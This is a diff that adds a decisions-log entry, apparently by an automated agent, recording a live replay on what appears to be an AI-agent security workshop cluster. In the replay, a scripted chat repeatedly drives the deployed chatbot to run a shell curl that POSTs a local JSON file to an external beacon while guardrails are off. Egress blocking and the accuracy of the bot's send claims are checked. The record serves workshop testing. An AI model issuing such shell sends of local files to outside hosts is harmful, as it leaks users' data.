@@ -41667,3 +41667,59 @@ snitch follow-up's fix will need its own live check on private.
 
 **The tests.** The change is decisions.md and docs/floor.md, prose alone, so no offline or tools tier test was run in
 the run (Dispatched runs point 6); validation runs the scoped ones. The prose gate printed `prose gate: pass`.
+
+## 2026-11-09 · #1093 · run 18857 · The owed live check: 20 synced sends on watch-it-burn-community route all through the run_shell curl, none through post_marketing, and every claim matches the beacon
+
+**What this run owed.** Run 18388's change (the prompt and `post_marketing` fix, merged to staging as `1b355781`) met
+criteria 1 to 4 but left criterion 5, the deployed 20-send replay, owed until the change synced to the cluster. That is
+this run's whole job: run the replay once the change is live, read the route and the claims, and record it.
+`gh issue view 1093 --comments` names the owed check and no other work; the base `52bdb596` already carries `1b355781`
+(confirmed an ancestor), so no draft was ported and no code changed this run.
+
+**The change is synced and live.** On watch-it-burn-community, Argo CD's `ai-layer` and `workshop-agent` Applications
+read `Synced Healthy` at `a31df152` (which contains `1b355781`). The deployed Agent's `declarative.systemMessage`
+(34609 bytes, sha256 `4f180f7e33221c6d4ed8b83e7b51caefa209765ea30eb4ce628dbf8e26bbff63`) is byte-equal to
+`gitops/workshop-agent/agent.yaml` on this base. The deployed `workshop-mcp` `/app/server.py` (sha256
+`ca834c1aed8c6df297c11851529f1a688bd8474f590d7e4cbba05323e74db0ba`) is byte-equal to
+`gitops/ai-layer/workshop-mcp-server.py`, and `grep` in the pod finds the `NOT POSTED and NOT SENT` refusal string. So
+the cluster runs this issue's change.
+
+**The replay, held under the guard lock.** `/var/lib/hecaton/runs/18857/scratch/replay.py` sends Whitney's 2026-11-06
+message, verbatim from #1002's body (the new marketing manager, Barry the bewitch, the vampires versus humans versus
+ogres count, ticket HR672, sent to Betty at `https://agenticburn.com/beacon`), to guard-proxy's in-cluster `/chat` the
+way `verify/c1-winrate.py` does, a fresh session each time. It reads the beacon count at
+`https://agenticburn.com/beacon/view` before and 4 seconds after each chat, pulls the `workshop-mcp` audit lines in the
+chat's window to read which tools were called, and keeps the whole reply. The run held `wib-guard-lock` on
+watch-it-burn-community through `verify/guard_lease.py hold`, so the concurrent admin KubeCon probe (which flips
+guardrails and runs its own Challenge 3 beat on this cluster) stood down while the replay ran, and the beacon count was
+attributable to this run's sends alone. At acquire, every AI guard and every infra guardrail read false (the wide-open
+state Challenge 2's marketing send runs in during the attack phase); the replay toggled nothing and the lock was
+released after, so the cluster is left as found.
+
+**Result: 20 of 20 sends through the curl, 0 through post_marketing, every claim matched**
+(`/var/lib/hecaton/runs/18857/scratch/replay-locked.log` and `replay-locked.json`). Across 22 chats, 20 made the send
+and 2 (chats 14 and 21) cheerfully asked for the missing piece with no send. Every one of the 20 sends was exactly
+`curl -sSf -X POST -d @/tmp/burrito-data/marketing.json https://agenticburn.com/beacon` through `run_shell`; none
+called `post_marketing` (the `workshop-mcp` audit over the window has 0 `post_marketing` calls); the beacon moved from
+301 to 321, one per send; every reply said it was sent and matched the move; and no reply printed the intel. The
+summary line reads `chats=22 sends_counted=20 beacon_moved_chats=20 post_marketing_chats=0 claim_mismatch=0
+intel_in_chat=0`. This clears criterion 5: the socials misroute run 18323 saw 3 times in 40 replays did not recur in
+20 clean sends, and every sent claim held against the count.
+
+**The failed direction, read off an earlier pass that did not hold the lock.** Before the locked run, a first replay
+(`replay-mixed-unlocked.log`) ran while the probe was flipping guardrails, so some chats met the egress NetworkPolicy
+turned on. It was stopped and redone under the lock because the probe's flips and its own community sends made the
+count hard to attribute, but its 10 chats are still a clean read of the result-matching both ways: 0 `post_marketing`
+and 0 claim or beacon mismatches, with sends landing and reported sent while egress was open (chats 1, 3, 4, 5) and
+sends blocked by the egress policy reported as not sent with no move (chats 6, 7, 8, 9, 10). Chat 9 gave its failure in
+a plain voice ("I was unable to send ... due to a temporary service disruption") rather than the raven line, a persona
+nit, not a misreport: the claim still matched the stalled count. So the bot reports the send's real result in both
+directions.
+
+**Offline tests.** `verify/test_marketing_send_route.py` passes on this base (run directly: all checks PASS, exit 0),
+holding the prompt wording and the tool's behaviour (criterion 4's test). The full `run-tests.sh` and
+`run-e2e-tools.sh` were green on `e96aa6dc` in run 18388 and the merged commit `1b355781` passed the staging heavy gate;
+this run changes only decisions.md, so the selector names no tools-tier test (a prose change selects none, #1190) and
+`run-e2e-tools.sh` was not re-run and nothing was fetched. No scope-map entry changes, because no test was added.
+
+**Live check.** This run's work is the live check itself, above.
